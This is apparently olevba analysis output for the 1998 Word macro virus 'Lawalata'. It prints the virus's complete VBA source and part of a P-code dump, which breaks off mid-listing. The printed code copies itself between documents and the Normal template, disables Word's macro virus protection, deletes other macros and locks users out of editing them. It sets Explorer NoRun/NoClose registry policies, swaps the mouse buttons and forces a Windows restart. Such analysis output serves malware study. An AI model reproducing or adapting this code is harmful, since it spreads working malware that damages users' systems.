olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lawalata
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lawalata - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lawalata.bas 
in file: Virus.MSWord.Lawalata - OLE stream: 'Macros/VBA/lawalata'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hi World.....
'It's my virus for you !
'My Name is LUMLAWALATA
'Thank's
'==================================
'I'm a friendly Virus always try say....
'Pray...pray....and... PRAY !!!
'I Love ISLAM !!





















Private Declare Function SwapMouseButton Lib "user32" (ByValbSwap As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal dwReserved As Long, ByVal uRreturnCode As Long) As Long

Public AD As Object, aDes As Variant
Public NonLUMLAWALATA As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function LumMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "lawalata"
nmak(1) = "LUMLAWALATA"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "LumNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "LumNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\LumNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "lawalata" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "lawalata"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "LUMLAWALATA"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonLUMLAWALATA = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "lawalata" And nmak.Name <> "LUMLAWALATA" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "LUMLAWALATA"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "LUMLAWALATA," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
LUMLAWALATA.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
LumMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    LumMaster
    End If
    Next
End If
If Now > DateSerial(1998, 12, 12) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="lawalata.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro LUMLAWALATA..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "LUMLAWALATA") _
= vbYes Then Send
Keys "%m%s{down}~%d'Macro non-LUMLAWALATA'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
LumMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "LumNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
LumMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\LumNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\LumNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonLUMLAWALATA Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".lawalata.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros LUMLAWALATA mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-LUMLAWALATA')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "LUMLAWALATA" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "LumNrml.dot" Then LumMaster
End Sub
Sub FileExit()
   AutoExit
End Sub
Sub ToolsOptions()
   Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
   Dialogs(wdDialogToolsOptions).Show
   Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
   WordBasic.disableautomacros True
End Function
Function WBF()
   WordBasic.disableautomacros False
End Function
Sub Kaspo()
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1
   System.PrivateProfileString("", "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "ISLAM"
   System.PrivateProfileString("", "HKEY_LOCAL_MACINE\SOFTAWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "The Power of The World"
End Sub
Sub GantiMouse()
On Error GoTo MouseCrash
SwapMouseButton &H4
MouseCrash:
End Sub

Sub RestartWin()
On Error GoTo RestartErr
ExitWindowsEx &H2, &HFFFFFFFF
RestartErr:
End Sub

Sub TulisTeks()
On Error GoTo TulisErr
   Call barisakhir
   Selection.TypeParagraph
   Selection.Font.Bold = True
   Selection.TypeText ("Maaf jika tulisan kecil ini mengganggu kerja Anda !")
   Selection.TypeParagraph
   Selection.TypeText ("Saya hanya mengingatkan Anda untuk tidak terlalu tegang dalam bekerja")
   Selection.TypeParagraph
   Selection.TypeText ("Gunakan waktu Anda selain untuk bekerja juga untuk beristirahat dengan nyaman")
   Selection.TypeParagraph
   Selection.TypeText ("Ingat !!! WAKTU adalah UANG")
   Selection.TypeParagraph
   Selection.TypeParagraph
   Selection.Font.Italic = True
   Selection.TypeText ("LUM LAWALATA")
TulisErr:
End Sub

Sub Tanya()
On Error GoTo TanyaErr
If System.Country = 62 Then
  takon = MsgBox("Anda suka Muslim ??!?!", vbYesNo, "Assalamu'alaikum..")
Else
  takon = MsgBox("Do you like MOSLEM ??!?!", vbYesNo, "Assalamu'alaikum..")
End If

If takon = vbYes Then
  If System.Country = 62 Then
    xx = MsgBox("Semoga Allah SWT selalu bersama Anda", , "LUMLAWALATA")
  Else
    xx = MsgBox("May ALLAH SWT BLESS YOU", , "LUMLAWALATA")
  End If
Else
  Kaspo
  GantiMouse
  RestartWin
End If
TanyaErr:
End Sub
Public Sub NoMacro()
End Sub
Function barisawal()
  Selection.GoTo What:=wdGotoEnd
  Selection.InsertBreak
End Function
Function barisakhir()
  Selection.GoTo What:=wdGoToLine, Which:=wdGoToRelative, Count:=90000000
  Selection.EndKey
End Function
Sub asal()
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 0
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO LUMLAWALATA.frm 
in file: Virus.MSWord.Lawalata - OLE stream: 'Macros/VBA/LUMLAWALATA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








































'Dear you .....
'It's my virus for you !
'My Name is LUMLAWALATA
'Thank's
'==================================
'I'm a friendly Virus always try say....
'Pray...pray....and... PRAY !!!
'I Love ISLAM !!





















































Dim Teks(4) As String
Private Sub CommandButton1_Click()
Do
    With LUMLAWALATA
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
End Sub
Private Sub UserForm_Activate()
TT
End Sub
Sub TT()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%
a = 1
diam = True
LUMLAWALATA.Enabled = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
    Label4.ForeColor = LUMLAWALATA.BackColor
    End If
    If tp Mod 600 = 0 Then
    Label4.ForeColor = &H80000009
End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        If a = 4 Then Label1.Font.Size = 16: Label1.Width = Image1.Width
        Label1.Caption = Label1.Caption & Mid(Teks(a), i, 1)
        If Mid(Teks(a), i, 1) Like "[! ]" Then Beep
            If Len(Label1.Caption) = Len(Teks(a)) Then
                If diam Then
                    Do
                    If Timer - tm > 1 Then Exit Do
                    DoEvents
                    Label4.ForeColor = LUMLAWALATA.BackColor
                    Loop
                    diam = False
                    If a = 4 Then GoTo catat
                End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
Loop
Exit Sub
catat:
If a <> 5 Then Label1.Caption = ""
tm = Timer
Label2.Left = Label1.Left + Label1.Width
a = a + 1
i = 0
diam = True
        If a = 5 Then
            Label4.Visible = False
            Frame1.Visible = True
            Image1.Visible = True
            LUMLAWALATA.Enabled = True
            CommandButton1.SetFocus
            Image1.Picture = LoadPicture(System.PrivateProfileString("", _
            "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper"))
            Exit Sub
        End If
Return
End Sub
Private Sub UserForm_Layout()
Dim waktu%, shalat$
waktu = Val(Format(Time, "hh"))
Select Case waktu
Case 12 To 14
shalat = "DZUHUR"
Case 15 To 17
shalat = "ASHAR"
Case 18 To 18
shalat = "MAGHRIB"
Case 19 To 23
shalat = "ISYA"
Case 0 To 2
shalat = "ISYA"
Case 5 To 5
shalat = "SUBUH"
Case Else
Label4.Visible = False
End Select
If System.Country = 62 Then
   Teks(1) = "Maaf !! Mungkin kehadiran LUMLAWALATA mengganggu kesibukan Anda, untuk itu sekali lagi maafkanlah kelancangan LUMLAWALATA .."
   Teks(2) = "Ingat...!! Kerja boleh tapi ingat istirahatlah sejenak biar enggak stres, pusing, uring-uringan, dsb..!"
   Teks(3) = "Untuk itu... istirahatlah yang cukup, hanya itu yang LUMLAWALATA sampaikan !"
   Teks(4) = "SHOLATlah sebelum di SHOLATkan"
   Label2.Left = Label1.Left + Label1.Width
   Label3.Caption = "By :" & Chr(13) & "LUM LAWALATA '98" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
   Label4.Caption = "Apakah Anda sudah sholat " & shalat & "!"
Else
   Teks(1) = "So sorry ...!! I visit your PC without ...???"
   Teks(2) = "Remember!! The MOSLEM POWER is NEVER DIE !"
   Teks(3) = "I Suggest you to ....."
   Teks(4) = "Toreh..toreh.. Mon e' angguy komputer paneka ! On laon bein Cong !"
   Label2.Left = Label1.Left + Label1.Width
   Label3.Caption = "By :" & Chr(13) & "LUM LAWALATA '98" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
   Label4.Caption = "Have the " & shalat & " Pray ?!"
End If
End Sub
Private Sub UserForm_Terminate()
    Dim i As Integer
    For i = 1 To 100
        Beep
    Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lawalata
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/lawalata - 18493 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000D "Hi World....."
' Line #1:
' 	QuoteRem 0x0000 0x0017 "It's my virus for you !"
' Line #2:
' 	QuoteRem 0x0000 0x0016 "My Name is LUMLAWALATA"
' Line #3:
' 	QuoteRem 0x0000 0x0007 "Thank's"
' Line #4:
' 	QuoteRem 0x0000 0x0022 "=================================="
' Line #5:
' 	QuoteRem 0x0000 0x0027 "I'm a friendly Virus always try say...."
' Line #6:
' 	QuoteRem 0x0000 0x001E "Pray...pray....and... PRAY !!!"
' Line #7:
' 	QuoteRem 0x0000 0x000F "I Love ISLAM !!"
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' 	FuncDefn (Private Declare Function SwapMouseButton Lib "user32" (ByValbSwap As Long) As Long)
' Line #30:
' 	FuncDefn (Private Declare Function ExitWindowsEx Lib "user32" (ByVal dwReserved As Long, ByVal uRreturnCode As Long) As Long)
' Line #31:
' Line #32:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #33:
' 	Dim (Public) 
' 	VarDefn NonLUMLAWALATA (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #34:
' 	FuncDefn (Function LumMaster())
' Line #35:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #36:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #37:
' 	Dim 
' 	VarDefn aSrc
' Line #38:
' 	OnError selesai 
' Line #39:
' 	LitStr 0x0008 "lawalata"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #40:
' 	LitStr 0x000B "LUMLAWALATA"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #41:
' Line #42:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #43:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #44:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #45:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #46:
' 	Ld aSrc 
' 	LitStr 0x000B "LumNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #47:
' 	Ld NT 
' 	St aSrc 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #52:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #53:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #54:
' 	Ld aSrc 
' 	LitStr 0x000B "LumNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #55:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #56:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000C "\LumNrml.src"
' 	Concat 
' 	St aSrc 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #60:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #61:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0008 "lawalata"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #62:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #63:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #64:
' 	LitStr 0x0008 "lawalata"
' 	MemStWith Description 
' Line #65:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #67:
' 	Ld NT 
' 	St CustomizationContext 
' Line #68:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #69:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #70:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #73:
' 	ElseBlock 
' Line #74:
' 	GoTo Aksi 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndWith 
' Line #77:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #78:
' 	ArgsCall Refresh 0x0000 
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Label Aksi 
' Line #81:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #82:
' 	ExitFunc 
' Line #83:
' 	Label selesai 
' Line #84:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Terimakasih Anda Telah"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001C "Memproteksi Word dengan Aman"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000B "LUMLAWALATA"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #85:
' 	EndFunc 
' Line #86:
' Line #87:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #88:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #89:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #90:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonLUMLAWALATA 
' 	EndIf 
' Line #91:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0008 "lawalata"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000B "LUMLAWALATA"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #92:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #93:
' 	Ld reset 
' 	IfBlock 
' Line #94:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #95:
' 	ElseBlock 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #102:
' 	Dim 
' 	VarDefn aNmak
' Line #103:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #104:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #105:
' 	StartForVariable 
' 	Next 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub Action())
' Line #108:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #111:
' 	LitStr 0x000B "LUMLAWALATA"
' 	MemStWith Caption 
' Line #112:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #113:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #114:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #117:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #118:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #119:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #120:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #121:
' 	LitStr 0x000C "LUMLAWALATA,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #122:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #123:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #124:
' 	EndWith 
' Line #125:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #126:
' 	ArgsCall Read 0x0000 
' Line #127:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #128:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #129:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #130:
' 	EndWith 
' Line #131:
' 	Ld LUMLAWALATA 
' 	ArgsMemCall Show 0x0000 
' Line #132:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #133:
' 	EndWith 
' Line #134:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #135:
' 	ArgsCall WBT 0x0000 
' Line #136:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #137:
' 	ArgsCall WBF 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub FileOpen())
' Line #140:
' 	ArgsCall WBT 0x0000 
' Line #141:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #142:
' 	ArgsCall WBF 0x0000 
' Line #143:
' 	ArgsCall AutoOpen 0x0000 
' Line #144:
' 	ElseBlock 
' Line #145:
' 	ArgsCall WBF 0x0000 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub AutoOpen())
' Line #149:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #150:
' 	ArgsCall LumMaster 0x0000 
' Line #151:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #153:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #154:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #155:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #156:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #157:
' 	ArgsCall LumMaster 0x0000 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	StartForVariable 
' 	Next 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x000C 
' 	LitDI2 0x000C 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:45:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000F "lawalata.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #162:
' 	End 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub ViewVbCode())
' Line #165:
' 	LineCont 0x0008 15 00 00 00 31 00 00 00
' 	LitStr 0x0006 "Maaf.."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0050 "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro LUMLAWALATA..!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "Anda hanya bisa merekam makro, menyimpan, menggunakan"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "serta menghapus makro buatan Anda"
' 	Concat 
' 	LitDI2 0x000D 
